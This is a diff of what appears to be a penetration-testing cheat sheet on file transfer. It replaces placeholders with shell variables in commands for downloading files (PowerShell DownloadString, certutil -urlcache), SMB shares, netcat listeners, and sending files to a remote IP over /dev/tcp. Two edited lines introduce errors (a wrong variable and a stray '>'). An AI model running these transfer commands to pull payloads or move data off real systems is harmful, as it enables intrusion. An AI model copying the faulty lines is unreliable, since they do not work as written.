@@ -23,7 +23,7 @@ layout:
 {% tab title="Linux" %}
 {% code overflow="wrap" %}
 ```sh
-md5sum <file>
+md5sum $FILE
 ```
 {% endcode %}
 {% endtab %}
@@ -31,7 +31,7 @@ md5sum <file>
 {% tab title="Windows" %}
 {% code overflow="wrap" %}
 ```sh
-certutil -hashfile <file> md5
+certutil -hashfile $FILE md5
 ```
 {% endcode %}
 {% endtab %}
@@ -44,19 +44,19 @@ certutil -hashfile <file> md5
 {% tabs %}
 {% tab title="Python3" %}
 ```sh
-python3 -m http.server <port>
+python3 -m http.server $PORT
 ```
 {% endtab %}
 
 {% tab title="Python2" %}
 ```sh
-python2 -m SimpleHTTPServer <port>
+python2 -m SimpleHTTPServer $PORT
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```sh
-php -S 0:<port>
+php -S 0:$PORT
 ```
 {% endtab %}
 {% endtabs %}
@@ -67,7 +67,7 @@ php -S 0:<port>
 {% tab title="Wget" %}
 {% code overflow="wrap" %}
 ```bash
-wget <url>
+wget $URL
 ```
 {% endcode %}
 {% endtab %}
@@ -75,7 +75,7 @@ wget <url>
 {% tab title="Curl" %}
 {% code overflow="wrap" %}
 ```bash
-curl -s <url> -o <output>
+curl -s $URL -o $OUTPUT_FILE
 ```
 {% endcode %}
 {% endtab %}
@@ -83,13 +83,13 @@ curl -s <url> -o <output>
 {% tab title="PowerShell" %}
 {% code overflow="wrap" %}
 ```powershell
-(New-Object Net.WebClient).DownloadString('<url>') > <output>
+(New-Object Net.WebClient).DownloadString("$URL") > $OUTPUT_FILE
 ```
 {% endcode %}
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-WebRequest <url> -o <output>
+Invoke-WebRequest $URL -o $OUTPUT_FILE
 ```
 {% endcode %}
 {% endtab %}
@@ -97,7 +97,7 @@ Invoke-WebRequest <url> -o <output>
 {% tab title="CMD" %}
 {% code overflow="wrap" %}
 ```sh
-certutil -urlcache -split -f <url> <output>
+certutil -urlcache -split -f $URL $OUTPUT_FILE
 ```
 {% endcode %}
 {% endtab %}
@@ -108,7 +108,7 @@ certutil -urlcache -split -f <url> <output>
 ### SMB Server
 
 ```sh
-smbserver.py <share> $(pwd) -smb2support [-username user -password pass]
+smbserver.py $SHARE . -smb2support [-username $USERNAME -password $PASSWORD]
 ```
 
 ### Download
@@ -117,7 +117,7 @@ smbserver.py <share> $(pwd) -smb2support [-username user -password pass]
 {% tab title="Linux" %}
 {% code overflow="wrap" %}
 ```sh
-smbclient -U 'user[%pass]' //<ip>/<share> -c "get <file> <output>"
+smbclient -U 'user[%pass]' //$IP/$SHARE -c "get $FILE $OUTPUT_FILE"
 ```
 {% endcode %}
 {% endtab %}
@@ -126,9 +126,9 @@ smbclient -U 'user[%pass]' //<ip>/<share> -c "get <file> <output>"
 {% code overflow="wrap" %}
 ```sh
 # mount smb Share to drive
-net use z: \\<ip>\<share> [/user:user pass]
+net use z: \\$IP\$SHARE [/user:$USERNAME $PASSWORD]
 # copy from share
-copy \\<ip>\<share>\<file> <output>
+copy \\$IP\$SHARE\$FILE $OUTPUT_FILE
 ```
 {% endcode %}
 {% endtab %}
@@ -140,7 +140,7 @@ copy \\<ip>\<share>\<file> <output>
 {% tab title="Send" %}
 {% code overflow="wrap" %}
 ```sh
-nc -nlvp <port> < <file>
+nc -nlvp $PORT < $OUTPUT_FILE
 ```
 {% endcode %}
 {% endtab %}
@@ -148,7 +148,7 @@ nc -nlvp <port> < <file>
 {% tab title="Recieve" %}
 {% code overflow="wrap" %}
 ```sh
-nc -nlvp <port> > <output>
+nc -nlvp $PORT > $OUTPUT_FILE
 ```
 {% endcode %}
 {% endtab %}
@@ -160,7 +160,7 @@ nc -nlvp <port> > <output>
 {% tab title="Send" %}
 {% code overflow="wrap" %}
 ```sh
-cat <file> > /dev/tcp/<ip>/<port>
+cat $FILE > /dev/tcp/$IP/$PORT>
 ```
 {% endcode %}
 {% endtab %}
@@ -168,7 +168,7 @@ cat <file> > /dev/tcp/<ip>/<port>
 {% tab title="Recieve" %}
 {% code overflow="wrap" %}
 ```sh
-cat < /dev/tcp/<target>/<port> > <output>
+cat < /dev/tcp/$IP/$PORT > $OUTPUT_FILE
 ```
 {% endcode %}
 {% endtab %}
